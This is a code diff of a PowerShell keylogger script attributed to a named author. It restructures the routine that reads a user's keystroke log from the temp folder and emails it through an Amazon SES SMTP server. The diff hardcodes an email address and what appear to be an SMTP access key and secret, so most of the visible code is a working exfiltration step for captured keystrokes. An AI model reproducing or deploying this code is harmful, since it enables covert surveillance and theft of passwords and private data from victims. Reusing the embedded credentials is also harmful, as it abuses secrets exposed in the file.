@@ -1,30 +1,40 @@
 # powershell keylogger
 # created by : Luke O'Sullivan
 
-
+$email = "lukeosullivan123@gmail.com"
+$smtpUser = "AKIAU2UDJAPS6AGCQU55"
+$smtpPass = "BBoDj+7tIeYSc9nwA+gmDyR1+tr8sR+EEdqPkX46exSi"
 
 # keylogger
 function KeyLogger($logFile="$env:temp/$env:UserName.log") {
 
   # email process
-powershell.exe -NoProfile -Command "
-$email='lukeosullivan123@gmail.com';
-$smtpUser='AKIAU2UDJAPS6AGCQU55';
-$smtpPass='BBoDj+7tIeYSc9nwA+gmDyR1+tr8sR+EEdqPkX46exSi';
-$logs = Get-Content '$logFile' -Raw;
-$subject = `$env:UserName + ' Logs';
-$msg=New-Object System.Net.Mail.MailMessage;
-$msg.From=$email;
-$msg.To.Add($email);
-$msg.Subject=$subject;
-$msg.Body=$logs;
-$smtp=New-Object System.Net.Mail.SmtpClient('email-smtp.eu-west-1.amazonaws.com',587);
-$smtp.EnableSsl=$true;
-$smtp.UseDefaultCredentials=$false;
-$smtp.DeliveryMethod=[System.Net.Mail.SmtpDeliveryMethod]::Network;
-$smtp.Credentials=New-Object System.Net.NetworkCredential($smtpUser,$smtpPass);
-$smtp.Send($msg)
-"
+  
+
+  # Define log file
+  $logFile = "$env:TEMP\$env:UserName.log"
+  $logs = Get-Content $logFile -Raw
+
+  # Prepare subject
+  $subject = "$env:UserName Logs"
+
+  # Create MailMessage
+  $msg = New-Object System.Net.Mail.MailMessage
+  $msg.From = $email
+  $msg.To.Add($email)
+  $msg.Subject = $subject
+  $msg.Body = $logs
+
+  # Configure SMTP client
+  $smtp = New-Object System.Net.Mail.SmtpClient("email-smtp.eu-west-1.amazonaws.com", 587)
+  $smtp.EnableSsl = $true
+  $smtp.UseDefaultCredentials = $false
+  $smtp.DeliveryMethod = [System.Net.Mail.SmtpDeliveryMethod]::Network
+  $smtp.Credentials = New-Object System.Net.NetworkCredential($smtpUser, $smtpPass)
+
+  # Send email
+  $smtp.Send($msg)
+
 
 
 
